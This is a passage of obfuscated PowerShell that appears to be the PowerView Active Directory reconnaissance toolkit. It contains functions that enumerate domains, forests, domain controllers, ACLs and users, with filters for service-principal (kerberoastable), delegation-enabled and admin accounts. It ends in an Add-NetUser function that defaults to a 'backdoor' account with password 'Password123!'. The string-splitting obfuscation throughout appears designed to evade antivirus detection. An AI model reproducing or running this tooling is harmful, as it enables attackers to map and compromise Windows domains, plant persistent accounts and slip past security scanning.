              [uint32]("{2}{1}{0}" -f'6',("{0}{1}" -f'00','11'),'0x0') = ("{0}{1}" -f 'Wri','te')
            }

            ${PeR`mIS`S`IOns} = @()

            
            ${p`eRmis`sIons} += ${SIMp`LE`Pe`RM`I`ssIOns}."K`EYS" |  &('%') {
                              if ((${f`sr} -band ${_}) -eq ${_}) {
                                ${si`M`p`LEPeRmisSi`ONs}[${_}]
                                ${F`SR} = ${f`sR} -band (-not ${_})
                              }
                            }

            
            ${p`eRmis`S`iONS} += ${a`Cc`EsSmAsk}."KE`YS" |
                            &('?') { ${f`sR} -band ${_} } |
                            &('%') { ${A`cCES`SM`AsK}[${_}] }

            (${peRM`Is`SiO`Ns} | &('?'){${_}}) -join ","
        }
    }

    process {

        try {
            ${a`CL} = &("{2}{0}{1}" -f't',("{0}{1}" -f '-','Acl'),'Ge') -Path ${pa`Th}

            ${A`Cl}."gE`Ta`C`cEss`RuLES"(${T`RUe},${Tr`UE},[System.Security.Principal.SecurityIdentifier]) | &("{2}{0}{1}" -f("{0}{1}" -f'h','-Obj'),'ect',("{1}{0}" -f 'orEac','F')) {

                ${n`Am`ES} = @()
                if (${_}."iDeNTi`TyREf`e`REN`Ce" -match ("{1}{7}{8}{4}{5}{3}{10}{0}{9}{2}{6}" -f'-[0',("{1}{0}" -f '5','^S-1-'),'9','-9]',("{0}{1}{3}{2}{4}"-f'0','-9]','-[0','+','-9]+-['),'0',']+',("{0}{1}" -f '-21','-'),'[','-','+')) {
                    ${ObJ`ecT} = &("{0}{2}{1}"-f 'Ge',("{0}{1}" -f 'DObjec','t'),'t-A') -SID ${_}."iDenTI`T`YrEFE`ReNcE"
                    ${Na`Mes} = @()
                    ${s`ids} = @(${ob`JeCT}."o`BJ`ECT`SID")

                    if (${rEC`Ur`sE} -and (${O`BJE`Ct}."SAm`A`Ccou`NttyPE" -ne ("{0}{2}{1}"-f'80',("{1}{0}"-f'06368','3'),'5'))) {
                        ${SI`DS} += &("{2}{1}{4}{0}{3}"-f ("{2}{1}{0}{3}" -f 'oupMe','Gr','et','mbe'),'-','Get','r','N') -SID ${ob`jECt}."Ob`je`CTsiD" | &("{1}{0}{2}" -f'j',("{0}{2}{3}{1}" -f'S','ct-Ob','el','e'),'ect') -ExpandProperty ("{1}{0}{2}{3}" -f'mb','Me','er','Sid')
                    }

                    ${Si`Ds} | &("{3}{1}{2}{0}" -f 't','o',("{3}{2}{1}{0}" -f 'jec','Ob','h-','rEac'),'F') {
                        ${nA`mEs} += ,@(${_}, (&("{1}{2}{3}{0}{4}" -f("{0}{1}" -f'-S','idTo'),("{0}{1}" -f'Co','nve'),'r','t',("{1}{0}"-f'me','Na')) ${_}))
                    }
                }
                else {
                    ${Na`meS} += ,@(${_}."idEntiT`Y`ReFeRE`NCE"."VA`LUe", (&("{1}{4}{2}{0}{3}" -f'm',("{1}{0}"-f 'nve','Co'),'Na','e',("{1}{0}{2}" -f 'SidT','rt-','o')) ${_}."I`deNtITyre`Fe`ReNce"."vA`lUE"))
                }

                ForEach(${N`AMe} in ${naM`Es}) {
                    ${O`Ut} = &("{3}{1}{0}{2}"-f 'bje','O','ct',("{1}{0}" -f'-','New')) ("{2}{0}{1}" -f ("{0}{1}"-f'SOb','j'),'ect','P')
                    ${O`Ut} | &("{0}{1}{2}" -f 'Ad','d',("{0}{1}"-f '-Mem','ber')) ("{2}{1}{3}{0}"-f 'ty',("{0}{1}"-f 'p','rop'),("{0}{1}"-f 'Not','e'),'er') ("{1}{0}"-f'h','Pat') ${Pa`TH}
                    ${O`UT} | &("{2}{1}{0}" -f ("{0}{1}" -f'mbe','r'),'-Me','Add') ("{0}{1}{2}"-f ("{0}{1}" -f'N','ote'),'p',("{1}{0}" -f 'operty','r')) ("{5}{3}{1}{0}{4}{2}" -f'h',("{1}{0}"-f 'mRig','e'),'s',("{0}{1}"-f 'eSy','st'),'t','Fil') (&("{2}{1}{3}{0}"-f't',("{1}{0}"-f 'i','leR'),("{2}{1}{0}" -f 'rt-Fi','onve','C'),'gh') -FSR ${_}."FI`Les`YstE`mRiGHtS"."V`AlUE__")
                    ${o`Ut} | &("{2}{1}{0}" -f ("{0}{1}" -f'emb','er'),("{0}{1}"-f 'd','d-M'),'A') ("{2}{1}{0}" -f 'rty',("{1}{0}"-f'e','prop'),("{1}{0}" -f 'ote','N')) ("{0}{1}{5}{4}{3}{2}" -f ("{0}{1}" -f 'Ide','nt'),'i',("{1}{0}" -f'nce','e'),("{1}{0}" -f 'efer','R'),'y','t') ${N`AMe}[1]
                    ${O`Ut} | &("{0}{2}{1}"-f ("{0}{1}"-f'Ad','d-M'),("{0}{1}" -f 'm','ber'),'e') ("{2}{0}{1}" -f 'pr',("{0}{1}" -f'oper','ty'),("{1}{0}"-f 'ote','N')) ("{1}{2}{0}" -f("{2}{1}{0}"-f 'tySID','i','t'),'Ide','n') ${na`ME}[0]
                    ${O`Ut} | &("{2}{1}{0}"-f ("{1}{0}" -f 'er','mb'),'Me',("{1}{0}"-f 'dd-','A')) ("{0}{1}{2}" -f'Not',("{1}{0}"-f'rop','ep'),("{0}{1}" -f'e','rty')) ("{1}{2}{3}{0}"-f'e',("{1}{0}"-f 'essC','Acc'),("{0}{1}" -f 'o','ntrol'),'Typ') ${_}."ACCES`ScontrO`Lt`YPE"
                    ${O`Ut}
                }
            }
        }
        catch {
            &("{3}{1}{2}{0}" -f 'ng','n','i',("{0}{1}{2}" -f 'Writ','e-','War')) ${_}
        }
    }
}


function get-NaM`E`F`I`e`Ld {
    
    
    
    [CmdletBinding()]
    param(
        [Parameter(mANdATory=${t`RuE},valuefRoMPiPeLine=${t`Rue})]
        ${O`Bje`Ct}
    )
    process {
        if(${O`BJEcT}) {
            if ( [bool](${o`BJecT}."p`S`objecT"."pRop`Ert`IES"."n`Ame" -match ("{1}{2}{0}" -f'e','dns',("{2}{0}{1}" -f 's','tnam','ho'))) ) {
                
                ${o`BJ`ECt}."dn`s`HOSTNamE"
            }
            elseif ( [bool](${oBjE`cT}."P`sOBjE`CT"."PRop`e`RTieS"."n`AmE" -match ("{0}{1}"-f'n','ame')) ) {
                
                ${o`BJect}."NA`mE"
            }
            else {
                
                ${obJ`ect}
            }
        }
        else {
            return ${n`Ull}
        }
    }
}


function co`N`VerT-lDA`pPrOPErTy {
    
    param(
        [Parameter(MaNDAtORy=${t`Rue},ValuEfROmpIpELINe=${T`RUe})]
        [ValidateNotNullOrEmpty()]
        ${p`Ro`p`ErtIes}
    )

    ${oBJe`c`TP`ROP`ErtiEs} = @{}

    ${P`RoPERti`eS}."pRoPERtyNA`M`es" | &("{3}{2}{1}{0}" -f 'ct',("{1}{0}"-f'e','ach-Obj'),'orE','F') {
        if ((${_} -eq ("{1}{0}{2}" -f("{0}{1}{2}"-f'b','jects','i'),'o','d')) -or (${_} -eq ("{1}{2}{0}" -f 'ry','s',("{1}{0}"-f 'isto','idh')))) {
            
            ${O`B`jE`cTPro`peRt`Ies}[${_}] = (&("{2}{0}{1}"-f'jec','t',("{0}{1}{2}" -f 'Ne','w-','Ob')) ("{1}{5}{7}{0}{8}{6}{3}{4}{2}"-f("{1}{0}"-f'ty','ri'),("{1}{0}" -f'ste','Sy'),("{2}{0}{3}{1}"-f'tyId','fier','ecuri','enti'),("{1}{0}" -f'l','ipa'),'.S',("{1}{0}" -f'Sec','m.'),'inc','u','.Pr')(${PRopeR`T`iES}[${_}][0],0))."v`ALue"
        }
        elseif(${_} -eq ("{1}{2}{0}" -f("{1}{0}"-f'uid','ctg'),'obj','e')) {
            
            ${ob`je`cTp`RO`pE`RtiEs}[${_}] = (&("{1}{3}{2}{0}"-f'ct','N',("{1}{0}" -f'-Obje','w'),'e') ("{1}{0}"-f 'd','Gui') (,${PRo`pER`T`IES}[${_}][0]))."G`UId"
        }
        elseif( (${_} -eq ("{2}{0}{3}{1}"-f 'stl','gon','la','o')) -or (${_} -eq ("{2}{0}{3}{1}"-f("{0}{1}" -f 'st','logo'),("{1}{0}" -f'tamp','es'),'la',("{0}{1}"-f 'nt','im'))) -or (${_} -eq ("{3}{0}{2}{1}"-f'wdl','et',("{1}{0}" -f 'sts','a'),'p')) -or (${_} -eq ("{0}{1}{2}" -f'la','st',("{1}{0}" -f 'ogoff','l'))) -or (${_} -eq ("{1}{2}{0}" -f 'ime',("{0}{1}"-f 'b','adP'),("{1}{0}"-f'swordT','as'))) ) {
            
            if (${pRoPer`T`iES}[${_}][0] -is [System.MarshalByRefObject]) {
                
                ${tE`mp} = ${p`ROPeRt`ies}[${_}][0]
                [Int32]${H`IGH} = ${T`emp}.("{2}{0}{1}"-f'etT','ype','G')."iN`VoKe"().("{3}{2}{1}{0}"-f'er','mb','e',("{0}{1}"-f'Invoke','M'))."IN`VOkE"(("{1}{2}{0}" -f 't',("{1}{0}"-f'gh','Hi'),'Par'),  ${BEW`9`TP}::"Ge`T`PROp`erty", ${Nu`LL}, ${T`Emp}, ${nu`Ll})
                [Int32]${L`OW}  = ${T`Emp}.("{1}{2}{0}" -f 'ype','Get','T')."INv`O`kE"().("{2}{1}{0}{3}"-f 'e',("{1}{0}" -f 'vokeM','n'),'I',("{1}{0}"-f 'r','mbe'))."Inv`Oke"(("{1}{0}" -f'art',("{1}{0}"-f'P','Low')),    ( &("{2}{1}{0}"-f("{1}{0}"-f 'm','iTe'),("{1}{0}" -f 'IlD','H'),'C') (("{0}{1}"-f 'V','ari')+("{0}{1}"-f'a','bLE:')+("{0}{1}{2}"-f'B','ew9','tp'))  )."va`lue"::"G`eTPro`pE`RTy", ${nU`ll}, ${t`EmP}, ${n`Ull})
                ${obJEC`TPRo`P`eRTIES}[${_}] = ( ${5M`BI}::"FR`oMFiLE`Ti`mE"."in`VOke"([Int64]("0x{0:x8}{1:x8}" -f ${hi`Gh}, ${L`oW})))
            }
            else {
                ${oBJE`ctpRO`pe`RTiES}[${_}] = (  ( &("{0}{2}{1}" -f'VA','blE','ria') ('5Mb'+'i') -VAlUe  )::"F`R`OM`FILeTimE"."I`NvO`KE"((${PR`opERtI`Es}[${_}][0])))
            }
        }
        elseif(${pR`O`P`ERTIeS}[${_}][0] -is [System.MarshalByRefObject]) {
            
            ${P`ROP} = ${PRope`RT`IeS}[${_}]
            try {
                ${t`EMP} = ${Pr`oP}[${_}][0]
                &("{2}{1}{0}{3}" -f ("{0}{1}" -f'r','bos'),("{0}{1}" -f 'ite','-Ve'),'Wr','e') ${_}
                [Int32]${hI`gh} = ${Te`mp}.("{1}{0}" -f ("{1}{0}"-f'e','Typ'),'Get')."iN`VoKE"().("{2}{1}{0}"-f ("{0}{1}" -f 'em','ber'),("{1}{0}"-f 'keM','o'),'Inv')."In`VokE"(("{2}{1}{0}" -f 'rt','a',("{0}{1}" -f 'Hi','ghP')),  ( &("{0}{2}{1}"-f 'VAR','e',("{0}{1}" -f 'Iab','L'))  (("{0}{1}" -f 'B','EW9t')+'p') )."VA`lUe"::"ge`TPr`OpE`RtY", ${NU`LL}, ${t`EmP}, ${Nu`lL})
                [Int32]${L`Ow}  = ${T`EMP}.("{0}{1}"-f 'Ge',("{1}{0}"-f'e','tTyp'))."iNvo`kE"().("{2}{0}{1}"-f 'M',("{1}{0}"-f'r','embe'),'Invoke')."INvO`kE"(("{1}{0}" -f't',("{1}{0}" -f'Par','Low')),    ${be`W9`Tp}::"gEt`pRop`e`RTy", ${nU`Ll}, ${T`emp}, ${nu`ll})
                ${obJ`EcT`propeR`TiES}[${_}] = [Int64]("0x{0:x8}{1:x8}" -f ${h`Igh}, ${l`Ow})
            }
            catch {
                ${O`B`jeC`TpRO`PeRtieS}[${_}] = ${P`RoP}[${_}]
            }
        }
        elseif(${PrOp`eRT`ies}[${_}]."co`UNT" -eq 1) {
            ${oBJ`e`cTPROpe`RTIES}[${_}] = ${prOPE`R`T`ies}[${_}][0]
        }
        else {
            ${o`B`JeCtPR`oPER`T`IES}[${_}] = ${proPe`R`Ti`eS}[${_}]
        }
    }

    &("{1}{0}{2}" -f'w-O','Ne',("{0}{1}" -f'bj','ect')) -TypeName ("{0}{1}{2}" -f'PSO','b',("{0}{1}" -f'j','ect')) -Property ${OBJ`ect`prO`peR`TIeS}
}









function g`Et`-Domain`seA`RcHeR {


    [CmdletBinding()]
    param(
        [String]
        ${D`OmA`IN},

        [String]
        ${dOmAinco`N`Tro`llEr},

        [String]
        ${a`DSp`ATh},

        [String]
        ${A`d`sPreFiX},

        [ValidateRange(1,10000)] 
        [Int]
        ${p`A`GESIZe} = 200
    )

    if(!${dO`ma`iN}) {
        ${d`OmAiN} = (&("{2}{0}{3}{1}{4}" -f'et','tD','G','-Ne',("{0}{1}"-f'o','main')))."Na`me"
    }
    else {
        if(!${dOMA`inCO`NTROl`L`er}) {
            try {
                
                
                ${D`OmaINc`o`NTr`OL`leR} = ((&("{0}{1}{3}{2}" -f("{0}{1}" -f 'Ge','t-'),'Net',("{1}{0}" -f 'in','ma'),'Do'))."PD`cROlE`o`wneR")."NA`me"
            }
            catch {
                throw ("{12}{10}{8}{7}{0}{13}{17}{4}{2}{15}{9}{11}{6}{3}{16}{1}{5}{14}" -f("{0}{1}{2}" -f 'her:',' E','rr'),("{0}{1}" -f 'e','nt '),("{0}{1}"-f 'tri','ev'),'r','e',("{1}{0}"-f 'a','dom'),'fo',("{0}{1}"-f'ear','c'),'inS','g P',("{0}{1}"-f'-D','oma'),'DC ','Get',("{0}{1}"-f 'or i','n'),'in','in',("{0}{1}" -f' cur','r'),' r')
            }
        }
    }

    ${Sea`RChSt`RI`Ng} = ("{0}{1}"-f 'L',("{0}{1}"-f'DAP','://'))

    if(${dOm`AIncONtR`O`lLeR}) {
        ${s`eArCH`stR`Ing} += ${d`OMAINcO`NTro`lLeR} + "/"
    }
    if(${AdS`Pref`Ix}) {
        ${Se`A`Rchst`RING} += ${Ad`SPre`FiX} + ","
    }

    if(${Ads`PA`Th}) {
        if(${aDSp`A`TH} -like ("{1}{0}" -f("{0}{1}" -f':','//*'),'GC')) {
            
            ${DI`sTingUiS`hED`NA`ME} = ${aD`spa`Th}
            ${seA`R`Ch`S`TriNG} = ""
        }
        else {
            if(${ad`SPAth} -like ("{0}{1}{2}"-f'L','DAP',("{0}{1}" -f':','//*'))) {
                ${ADSP`A`TH} = ${A`Ds`patH}.("{2}{1}{0}" -f ("{0}{1}"-f 'tr','ing'),'bs','Su')."iNvO`kE"(7)
            }
            ${DiST`I`N`GuI`sHedna`me} = ${a`Dsp`ATh}
        }
    }
    else {
        ${DiS`Tin`gui`shEDNAMe} = "DC=$($Domain.Replace('.', ',DC='))"
    }

    ${sear`C`hsT`RIng} += ${D`IST`IN`GuishednA`Me}
    &("{1}{2}{0}" -f ("{0}{1}{2}"-f '-Verbo','s','e'),'Wr','ite') ('G'+("{0}{1}" -f 'et-D','om')+("{0}{1}"-f'ai','nS')+'ear'+("{0}{1}"-f 'che','r ')+("{1}{0}"-f 'ar','se')+'ch'+' '+("{0}{1}" -f 'stri','ng')+': '+"$SearchString")

    ${Sea`RC`heR} = &("{0}{3}{1}{2}" -f 'N','w-O',("{0}{1}" -f 'bjec','t'),'e') ("{10}{8}{1}{5}{6}{0}{4}{7}{9}{3}{2}"-f ("{2}{0}{1}" -f 'i','ces.D','rv'),("{0}{1}"-f 's','tem.Dir'),'her','c',("{1}{0}"-f'ect','ir'),("{1}{2}{0}"-f'ryS','ec','to'),'e','o','y',("{0}{1}"-f'ryS','ear'),'S')([ADSI]${sE`ARCH`sTRiNG})
    ${sEA`R`c`HeR}."Pa`G`esIze" = ${PaGe`Size}
    ${sEAr`C`Her}
}


function G`e`T-n`etD`oma`in {


    [CmdletBinding()]
    param(
        [Parameter(ValuEfRoMPiPeLINe=${t`RUe})]
        [String]
        ${D`oma`IN}
    )

    process {
        if(${D`OmAin}) {
            ${do`maInCoNt`exT} = &("{1}{0}{2}"-f 'ec',("{1}{0}{2}"-f'w-Ob','Ne','j'),'t') ("{10}{6}{3}{0}{12}{2}{9}{5}{14}{7}{4}{13}{11}{1}{8}" -f("{0}{1}" -f'ySe','rvi'),'Con','s','tor','ir',("{1}{0}" -f'ec','iveDir'),'rec',("{1}{0}"-f'y.D','r'),("{1}{0}"-f'xt','te'),("{1}{0}"-f 'ct','.A'),("{3}{2}{0}{1}" -f'.D','i','stem','Sy'),'y','ce',("{0}{1}" -f 'ec','tor'),'to')(("{1}{2}{0}"-f 'n','D',("{1}{0}"-f 'ai','om')), ${doma`In})
            try {
                 (  &("{2}{1}{0}" -f 'E',("{1}{0}" -f'abL','ri'),("{0}{1}" -f'get-v','A'))  ("{0}{1}" -f 'Au0W','Q')  -VA)::("{1}{2}{0}"-f ("{1}{0}" -f 'n','omai'),'Get','D')."I`NVOkE"(${D`omA`iN`CO`NtExT})
            }
            catch {
                &("{3}{2}{1}{0}"-f ("{0}{1}"-f 'ni','ng'),'War',("{0}{1}" -f 'it','e-'),'Wr') ('Th'+'e '+("{1}{0}" -f 'pec','s')+'if'+("{0}{1}" -f'i','ed ')+("{0}{1}" -f 'd','oma')+'i'+'n '+("$Domain "+'')+("{0}{1}"-f'doe','s')+' '+'not'+' '+'e'+("{0}{1}" -f'xist,',' ')+'co'+("{1}{0}" -f'd ','ul')+'not'+' '+'b'+'e '+'co'+("{2}{0}{1}" -f 'a','cte','nt')+'d,'+' '+'or'+' '+'th'+("{1}{0}" -f 're ','e')+((("{0}{1}" -f 'isn','dR')+'A'+'t ')-creplaCE  'dRA',[char]39)+'an'+' '+'exi'+'sti'+'ng '+'tr'+'us'+'t.')
                ${Nu`ll}
            }
        }
        else {
              ${a`U0`wq}::("{4}{0}{2}{3}{1}" -f'r','ain','r',("{1}{0}" -f 'm','entDo'),("{0}{1}"-f'Ge','tCu'))."INV`o`Ke"()
        }
    }
}


function g`E`T-`NEtforEsT {


    [CmdletBinding()]
    param(
        [Parameter(vAlUeFrOmpIPElinE=${T`Rue})]
        [String]
        ${foRe`ST}
    )

    process {
        if(${f`OrE`St}) {
            ${Fo`REs`T`cONTExt} = &("{2}{0}{1}"-f'O',("{1}{0}" -f 't','bjec'),("{0}{1}"-f'N','ew-')) ("{4}{5}{7}{2}{6}{3}{8}{1}{0}{10}{9}{11}{12}" -f'e','Dir','r',("{1}{0}" -f're','eDi'),'Sy','st',("{1}{3}{0}{2}" -f '.A','yService','ctiv','s'),("{0}{3}{2}{1}"-f 'em.Di','o','ct','re'),("{0}{1}"-f'cto','ry.'),'r','cto','yC',("{0}{2}{1}"-f 'onte','t','x'))(("{1}{2}{0}"-f't','Fo','res'), ${f`o`ReSt})
            try {
                ${For`e`sT`Obj`ECT} =   ${X`4`yGJB}::("{1}{0}"-f ("{1}{0}{2}" -f 'Fo','t','rest'),'Ge')."In`VokE"(${ForE`STc`On`TEXT})
            }
            catch {
                &("{1}{0}{2}"-f ("{1}{0}"-f'eb','te-D'),'Wri','ug') ('The'+' '+'spe'+'c'+("{0}{1}" -f'ified',' ')+'f'+'ore'+'st '+("$Forest "+'')+'do'+'es '+'not'+' '+'exi'+("{0}{1}" -f 'st,',' ')+'cou'+'ld '+'not'+' '+'b'+'e '+'co'+'nta'+'c'+("{0}{1}" -f't','ed, ')+'o'+'r '+'the'+'re '+(('i'+("{0}{2}{1}" -f'snc','at','r')+' ') -rEplAcE  ([ChaR]99+[ChaR]114+[ChaR]97),[ChaR]39)+'an'+' '+'ex'+("{0}{1}" -f 'isting',' ')+'t'+("{0}{1}" -f'rust','.'))
                ${nU`LL}
            }
        }
        else {
            
            ${Fo`Res`ToBJeCT} =  (&("{0}{2}{1}" -f'ge','m',("{0}{1}" -f'T','-iTE')) ("{2}{3}{1}{0}" -f '4ygjB','riABLe:X','v','A') )."v`AluE"::("{3}{1}{2}{0}" -f'est',("{1}{2}{0}" -f 'nt','Cu','rre'),'For','Get')."InV`O`kE"()
        }

        if(${forE`sTo`Bj`Ect}) {
            
            ${F`OrEsT`SiD} = (&("{1}{0}{3}{2}"-f 'e','N',("{0}{1}"-f'Ob','ject'),'w-') ("{4}{1}{0}{2}{3}{5}" -f ("{1}{0}"-f'y.','rit'),("{1}{0}{2}"-f'm.S','e','ecu'),("{0}{2}{1}{3}{4}"-f 'P','.','rincipal','N','TAcco'),'un',("{1}{0}" -f'yst','S'),'t')(${fOReSToB`Je`Ct}."rO`O`TdoMAin",("{1}{0}"-f 'gt',("{1}{0}"-f 'bt','kr'))))."tR`ANsl`AtE"([System.Security.Principal.SecurityIdentifier])."V`ALuE"
            ${par`TS} = ${f`O`RestsiD} -Split "-"
            ${fo`R`e`stSID} = ${par`Ts}[0..$(${PAR`TS}."LEng`TH"-2)] -join "-"
            ${fO`ReStOb`ject} | &("{0}{2}{1}"-f'Add',("{1}{0}"-f 'ber','em'),'-M') ("{0}{2}{1}{3}" -f'No','p',("{1}{0}" -f 'o','tePr'),("{0}{1}" -f 'ert','y')) ("{2}{0}{1}{3}"-f'Dom',("{1}{0}"-f'inS','a'),("{1}{0}"-f 'ot','Ro'),'id') ${foRe`St`siD}
            ${fOREsTO`BJE`CT}
        }
    }
}


function gE`T-nEtFOR`E`stdoM`A`IN {


    [CmdletBinding()]
    param(
        [Parameter(valuEFRompIpELINe=${Tr`UE})]
        [String]
        ${f`O`ReST},

        [String]
        ${DO`M`Ain}
    )

    process {
        if(${dOM`A`IN}) {
            
            if(${Doma`IN}.("{2}{1}{0}"-f 'ns',("{0}{1}" -f 'nt','ai'),'Co')."iN`VoKe"('*')) {
                (&("{0}{2}{1}{3}" -f 'Ge','s',("{1}{2}{0}" -f 'e','t-Ne','tFor'),'t') -Forest ${f`O`REST})."D`omai`NS" | &("{2}{1}{0}" -f ("{0}{1}"-f 'bjec','t'),'-O',("{1}{0}"-f 'e','Wher')) {${_}."n`AmE" -like ${dom`AIN}}
            }
            else {
                
                (&("{4}{0}{2}{1}{3}" -f'Net','ore','F','st',("{1}{0}"-f 'et-','G')) -Forest ${FOrE`St})."d`OmA`InS" | &("{0}{1}{2}{3}"-f'Wh','er',("{1}{0}" -f '-Obj','e'),'ect') {${_}."N`AMe".("{0}{2}{1}"-f'To','r',("{0}{1}" -f'Low','e'))."In`V`oKe"() -eq ${d`O`mAin}.("{2}{1}{0}" -f'r',("{1}{0}"-f 'Lowe','o'),'T')."INVO`ke"()}
            }
        }
        else {
            
            ${Fo`R`EstoBJ`ECT} = &("{4}{0}{2}{1}{3}"-f'e',("{0}{1}"-f'ore','s'),'tF','t',("{1}{0}" -f'et-N','G')) -Forest ${For`est}
            if(${f`oreStO`B`J`ECt}) {
                ${fo`R`e`stoB`Ject}."DoMA`INS"
            }
        }
    }
}


function GEt`-`NETfORE`StC`A`TA`LOG {


    [CmdletBinding()]
    param(
        [Parameter(VaLuEFROMpipeLine=${tR`Ue})]
        [String]
        ${F`orEst}
    )

    process {
        ${fo`R`EsTob`j`ect} = &("{1}{2}{3}{4}{0}"-f'est',("{0}{1}" -f 'G','et-'),'N','etF','or') -Forest ${F`ORe`ST}
        if(${fore`sT`OBJE`cT}) {
            ${F`OrE`SToBjEcT}.("{0}{2}{3}{1}{4}"-f 'Fi',("{1}{2}{0}"-f'a','ob','alC'),'n',("{0}{1}"-f 'dAllG','l'),("{0}{1}" -f 'tal','ogs'))."I`Nvoke"()
        }
    }
}


function GeT-neTd`om`Ain`coNTROl`leR {


    [CmdletBinding()]
    param(
        [Parameter(vaLUefRompIPEline=${Tr`UE})]
        [String]
        ${do`MAiN},

        [String]
        ${DOm`AI`NcONtrO`lLEr},

        [Switch]
        ${L`daP}
    )

    process {
        if(${Ld`Ap} -or ${Do`mai`NCoNT`Ro`lLeR}) {
            
            &("{0}{3}{2}{1}"-f 'Get','er',("{0}{1}"-f'Co','mput'),("{1}{0}" -f 't','-Ne')) -Domain ${Dom`AiN} -DomainController ${Dom`AIN`cO`N`T`ROlleR} -FullData -Filter ("{8}{4}{1}{9}{6}{2}{0}{11}{14}{5}{3}{7}{13}{12}{10}"-f ':','s','l','56.','u',("{1}{0}{2}"-f '0','4','.1135'),("{1}{2}{0}" -f'ro','ccountCo','nt'),'1.','(','erA',((("{0}{1}" -f'03:=81','92)'))),'1.','8','4.','2.8')
        }
        else {
            ${fO`UNdd`OmAiN} = &("{1}{2}{0}" -f'ain',("{1}{0}"-f'et-N','G'),("{1}{0}"-f 'Dom','et')) -Domain ${do`MaiN}
            
            if(${Fo`U`NDDom`AIn}) {
                ${fO`UndD`o`maIN}."DoMainC`oN`TROLle`Rs"
            }
        }
    }
}








function g`Et-`NetU`S`eR {


    [CmdletBinding()]
    param(
        [Parameter(VaLUeFromPiPelINe=${Tr`UE})]
        [String]
        ${Use`Rn`Ame},

        [String]
        ${d`o`maIn},

        [String]
        ${DO`M`Ai`Nc`Ontroll`eR},

        [String]
        ${A`DS`paTh},

        [String]
        ${f`iL`Ter},

        [Switch]
        ${s`Pn},

        [Switch]
        ${AD`m`iNcouNt},

        [Switch]
        ${u`NcOnstrAi`N`ed},

        [Switch]
        ${ALlOw`DEl`E`G`A`Tion},

        [ValidateRange(1,10000)] 
        [Int]
        ${pa`ges`IZe} = 200
    )

    begin {
        
        ${USE`RsEa`RchER} = &("{4}{1}{3}{0}{2}"-f 'h','S','er',("{1}{0}" -f'arc','e'),("{2}{0}{1}" -f '-Domai','n','Get')) -Domain ${do`MaIn} -ADSpath ${a`dspATh} -DomainController ${dom`A`INcO`NTR`olL`eR} -PageSize ${page`s`IZe}
    }

    process {
        if(${usER`SEAr`CHeR}) {

            
            if(${U`N`cOnstrA`INeD}) {
                &("{1}{3}{2}{0}"-f ("{2}{0}{1}"-f'erbos','e','-V'),'W','e','rit') ("{5}{3}{0}{2}{4}{1}{6}"-f'o',("{0}{1}" -f'tra','i'),("{0}{2}{1}"-f 'r u','co','n'),("{1}{0}{2}" -f 'ing','k',' f'),'ns',("{0}{1}" -f'Che','c'),("{2}{3}{1}{0}"-f 'gation','e','ned d','el'))
                ${fIl`TeR} += (("{4}{14}{6}{12}{3}{7}{9}{0}{10}{11}{13}{8}{5}{1}{2}"-f("{1}{0}"-f '0.113','4'),'24',((("{0}{1}" -f'288',')'))),("{1}{0}" -f'ro','nt'),((("{1}{0}"-f 'Acco','(user'))),("{0}{1}" -f'4.803:','=5'),'nt','l:1','.1.',("{0}{1}"-f '.','2.8'),'5','5','Co','6','u'))
            }
            if(${aLl`owDEleGA`TI`oN}) {
                &("{4}{0}{3}{2}{1}" -f 'i','ose','b',("{1}{2}{0}" -f 'er','te-','V'),'Wr') ("{2}{1}{3}{10}{5}{4}{6}{0}{9}{8}{7}"-f 'n b','he','C','c',("{2}{0}{1}" -f 'use','rs who','r '),'fo',' ca',("{1}{0}"-f 'd','egate'),'el','e d',("{0}{1}"-f 'king',' '))
                
                ${fIlt`ER} += (("{3}{10}{8}{9}{7}{5}{6}{0}{2}{1}{4}" -f ("{0}{1}"-f'ount','C'),("{0}{3}{1}{4}{2}" -f '.84','55','4.803','0.113','6.1.'),("{1}{2}{0}" -f '1.2','ontro','l:'),'(!',((("{2}{1}{3}{0}" -f '74))','=1',':','0485'))),'Ac','c','er','u','s','('))
            }
            if(${A`Dm`iNC`ouNt}) {
                &("{4}{1}{3}{0}{2}" -f 'os','-V','e','erb',("{1}{0}"-f 'te','Wri')) ("{2}{7}{3}{4}{5}{1}{0}{6}"-f 'nt',("{0}{1}"-f 'minC','ou'),'C','ck',("{0}{1}"-f'ing ','fo'),("{0}{1}"-f 'r',' ad'),'=1','he')
                ${FI`l`TEr} += (("{2}{3}{0}{1}"-f("{0}{1}" -f 'coun','t'),'=1)','(ad','min'))
            }

            
            if(${Us`Er`NAmE}) {
                
                ${U`SeR`SE`ARCHeR}."f`IltER"="(&(samAccountType=805306368)(samAccountName=$UserName)$Filter)"
            }
            elseif(${S`pN}) {
                ${userSe`Ar`ch`eR}."FiL`TEr"="(&(samAccountType=805306368)(servicePrincipalName=*)$Filter)"
            }
            else {
                
                ${us`eRsEAr`chER}."Fil`TeR"="(&(samAccountType=805306368)$Filter)"
            }

            ${uSE`R`SEARcher}.("{1}{0}"-f ("{1}{0}" -f'l','dAl'),'Fin')."iN`VOKE"() | &("{2}{3}{0}{1}"-f '-',("{1}{0}" -f 'bject','O'),'Whe','re') {${_}} | &("{3}{0}{2}{1}"-f ("{1}{0}"-f'h-Ob','ac'),'ct','je',("{0}{1}" -f 'F','orE')) {
                
                &("{0}{2}{4}{3}{1}"-f ("{1}{0}{2}"-f'r','Conve','t'),'y','-',("{1}{0}"-f 'rt','ope'),("{2}{1}{0}" -f 'r','P','LDAP')) -Properties ${_}."PR`O`perTIEs"
            }
        }
    }
}


function A`DD`-n`eTu`SEr {


    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        ${USE`Rna`ME} = ("{2}{0}{1}"-f'doo','r',("{1}{0}" -f 'ack','b')),

        [ValidateNotNullOrEmpty()]
        [String]
        ${P`ASsw`Ord} = ("{0}{2}{1}"-f'P',("{2}{1}{0}" -f'rd123!','o','ssw'),'a'),

        [ValidateNotNullOrEmpty()]
        [String]
        ${G`ROUpNa`ME},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}"-f'ost','H',{"{0}{1}" -f 'Nam','e'}})]
        [String]
        ${C`OMpU`TEr`Na`mE} = ("{0}{1}{2}" -f("{1}{0}" -f'l','loca'),'ho','st'),

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`o`maiN}
    )

    if (${d`OmaiN}) {

        ${d`o`maINObJE`CT} = &("{2}{3}{0}{1}" -f("{1}{0}" -f'om','tD'),'ain',("{0}{1}" -f'Get-','N'),'e') -Domain ${DOmA`in}
        if(-not ${dO`Main`ob`jecT}) {
